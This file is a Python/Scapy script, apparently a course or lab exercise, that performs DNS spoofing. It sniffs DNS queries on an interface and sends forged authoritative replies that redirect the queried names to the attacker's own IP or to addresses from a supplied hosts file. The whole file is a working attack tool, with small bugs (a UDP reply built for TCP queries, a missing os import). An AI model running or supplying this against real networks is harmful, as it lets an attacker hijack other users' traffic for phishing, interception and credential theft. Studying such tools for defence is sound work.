#! /usr/bin/python

from scapy.all import *
from optparse import OptionParser
import socket
import netifaces


# http://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html
# https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib

class DnsInject:
    def __init__(self, interface, hosts, expression):
        self.interface = interface

        if self.interface is None:
            interfaces = netifaces.interfaces()
            interfaces.remove("lo")
            self.interface = str(interfaces[0])

        self.host = hosts
        self.expression = expression
        self.host_dict = {}
        if self.host is not None:
            self.parse_host()

    def parse_host(self):
        if os.path.exists(self.host):
            file = open(self.host, 'r')
            # check file exists or not
            for line in file.readlines():
                ip, address = line.split()
                self.host_dict[address] = ip
            file.close()

    def start_dnsspoof(self):
        local_ip = self.get_local_ip()

        def dns_callback(packet):
            if packet.haslayer(DNSQR):
                if packet[DNS].qd.qname in self.host_dict:
                    local_ip = str(self.host_dict[packet[DNS].qd.qname])
                if packet.haslayer(UDP) and packet.haslayer(IP):
                    spoofed_packet = \
                        IP(dst=packet[IP].src,
                           src=packet[IP].dst) / \
                        UDP(dport=packet[UDP].sport,
                            sport=packet[UDP].dport) / \
                        DNS(id=packet[DNS].id,
                            qd=packet[DNS].qd,
                            aa=1,
                            qr=1, \
                            an=DNSRR(
                                rrname=packet[DNS].qd.qname,
                                ttl=10,
                                rdata=local_ip)
                            )
                    send(spoofed_packet)
                    print 'Sent:', spoofed_packet.summary()
                elif packet.haslayer(TCP) and packet.haslayer(IP):
                    spoofed_packet = \
                        IP(dst=packet[IP].src,
                           src=packet[IP].dst) / \
                        UDP(dport=packet[TCP].sport,
                            sport=packet[TCP].dport) / \
                        DNS(id=packet[DNS].id,
                            qd=packet[DNS].qd,
                            aa=1,
                            qr=1, \
                            an=DNSRR(
                                rrname=packet[DNS].qd.qname,
                                ttl=10,
                                rdata=local_ip)
                            )
                    send(spoofed_packet)
                    print 'Sent:', spoofed_packet.summary()


        sniff(
            filter=self.expression,
            prn=dns_callback,
            store=0,
            iface=self.interface
        )

    def get_local_ip(self):
        # return "127.0.0.1"
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]


if __name__ == '__main__':
    optparser = OptionParser()
    optparser.set_conflict_handler("resolve")
    optparser.add_option("-i", "--interface", dest="interface", help="interface")
    optparser.add_option("-h", "--hosts", dest="hosts", help="file with a list of hosts")

    (options, args) = optparser.parse_args()
    expression = " ".join(args)

    dnsinject = DnsInject(options.interface,
                          options.hosts,
                          expression
                          )

    dnsinject.start_dnsspoof()
